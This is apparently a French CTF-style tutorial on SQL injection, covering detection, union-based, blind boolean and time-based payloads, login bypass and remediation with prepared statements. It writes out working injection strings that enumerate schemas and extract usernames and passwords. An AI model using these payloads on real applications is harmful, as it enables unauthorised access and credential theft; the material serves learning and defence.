# 🎯 Injection SQL (SQLi) 

L'injection SQL (SQLi) est l'une des vulnérabilités les plus anciennes et les plus dévastatrices. Elle survient lorsqu'une application inclut des données utilisateur non validées directement dans une requête SQL envoyée à la base de données.

---

## 🔍 1. Détection & Concepts de Base

### Pourquoi ça arrive ?
L'application concatène naïvement les entrées utilisateur :
`SELECT * FROM users WHERE id = ` + `user_input`;
Si `user_input` est `1 OR 1=1`, la requête devient malveillante.

### Comment détecter une SQLi ?
Pour confirmer la vulnérabilité, il faut "casser" la syntaxe SQL originale :
- **Caractères de test** : `'` (apostrophe), `"` (guillemets), `)` (parenthèses).
- **Indicateur** : Si la page affiche une erreur de syntaxe SQL ou si le contenu change de manière inattendue, c'est vulnérable.
- **Commentaires SQL** : Utiles pour ignorer le reste de la requête originale.
    - MySQL/PostgreSQL : `-- ` (espace obligatoire après les tirets) ou `#`
    - MS SQL : `--`

---

## ⚡ 2. In-Band SQLi (Le plus direct)
L'attaque et les résultats passent par le même canal (ex: les données sont affichées directement sur la page web).

### A. Error-Based SQLi
L'application affiche les erreurs SQL directement à l'écran. C'est idéal pour énumérer la structure rapidement en lisant les détails de l'erreur.

### B. Union-Based SQLi (Méthodologie CTF pas à pas)
On utilise l'opérateur `UNION` pour ajouter nos propres résultats à la requête originale.

#### Étape 1 : Trouver le nombre de colonnes
La clause `UNION SELECT` doit avoir le **même nombre de colonnes** que la requête originale.
- **Méthode ORDER BY** : `1' ORDER BY 1-- `, `1' ORDER BY 2-- `... Si `ORDER BY 4` fait une erreur mais pas `3`, il y a **3 colonnes**.
- **Méthode UNION** : `1' UNION SELECT 1-- `, `1' UNION SELECT 1,2-- `... jusqu'à ce que l'erreur disparaisse.

#### Étape 2 : Identifier les colonnes affichées
Si vous avez 3 colonnes :
`0' UNION SELECT 1,2,3-- `
*(Note: on utilise un ID inexistant comme 0 pour que le résultat original soit vide et que SEUL notre résultat s'affiche).*
Si le chiffre "2" apparaît sur la page, c'est dans la **colonne 2** que nous injecterons nos payloads.

#### Étape 3 : Extraire le nom de la base de données
Injectez dans la colonne visible (ex: la 2) :
`0' UNION SELECT 1,database(),3-- `
👉 Résultat affiché : `sqli_one`

#### Étape 4 : Lister les tables
`0' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema = 'sqli_one'-- `
👉 Résultat : `users,products,staff_users`

#### Étape 5 : Lister les colonnes d'une table cible
`0' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name = 'staff_users'-- `
👉 Résultat : `id,username,password`

#### Étape 6 : Exfiltrer les données
`0' UNION SELECT 1,group_concat(username,':',password SEPARATOR '<br>'),3 FROM staff_users-- `
👉 Résultat : `admin:p4ssword`

---

## 🌑 3. Blind SQLi (L'aveugle)
Ici, aucune donnée ni erreur n'est affichée. On ne reçoit qu'un feedback indirect (Vrai/Faux ou Temps).

### A. Authentication Bypass (Le plus simple)
Souvent utilisé sur les formulaires de login pour contourner la vérification.
- **Payload type** : `' OR 1=1;--`
- **Explication** : La requête devient `WHERE username='' AND password='' OR 1=1;`. Comme `1=1` est toujours vrai, la base de données répond "Oui" et l'application vous connecte.

### B. Boolean-Based (Basé sur le contenu)
On pose des questions binaires (Vrai ou Faux) en observant un changement sur la page (ex: "User taken" vs "User available").

**Playbook pour deviner le nom de la DB :**
1. Confirmer la vulnérabilité : `admin' UNION SELECT 1,2,3;--` (Si la page répond "Vrai", le nombre de colonnes est correct).
2. Tester la 1ère lettre : `admin' UNION SELECT 1,2,3 WHERE database() LIKE 's%';-- `
3. Si la page répond "Vrai", la DB commence par 's'.
4. Continuer : `... LIKE 'sq%';-- `, `... LIKE 'sqli%';-- `... jusqu'à trouver le nom complet.

### C. Time-Based (Basé sur le temps)
Si aucun changement n'est visible sur la page, on force la base de données à "dormir" si une condition est remplie.
- **Payload** : `admin' UNION SELECT SLEEP(5),2;-- `
- **Logique** : Si le serveur met 5 secondes à répondre, la requête est valide. On utilise alors :
    `admin' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';-- `
    - Si ça met 5 secondes : La DB commence par 's'.
    - Si c'est instantané : Non.

---

## 📡 4. Out-of-Band SQLi
L'attaque utilise deux canaux différents.
1. L'attaquant envoie la charge utile via HTTP.
2. La DB exécute la charge qui la force à faire une requête externe (DNS ou HTTP) vers un serveur contrôlé par l'attaquant pour livrer les données.
*(Rare, dépend de configurations spécifiques comme l'accès réseau de la DB).*

---

## 🛡️ 5. Remédiation (La Défense)

1.  **Requêtes Préparées (Prepared Statements)** : Le code SQL est compilé à l'avance, les entrées utilisateur ne sont que des paramètres. **C'est la solution ultime.**
    *   *PHP PDO* : `$db->prepare("SELECT * FROM users WHERE id = ?");`
2.  **Validation d'Input (Allow-list)** : Vérifier que l'entrée correspond au format attendu (ex: `is_numeric()`).
3.  **Échappement des caractères** : Utiliser des fonctions comme `mysqli_real_escape_string()` pour neutraliser les quotes, mais c'est moins sûr que les requêtes préparées.

---
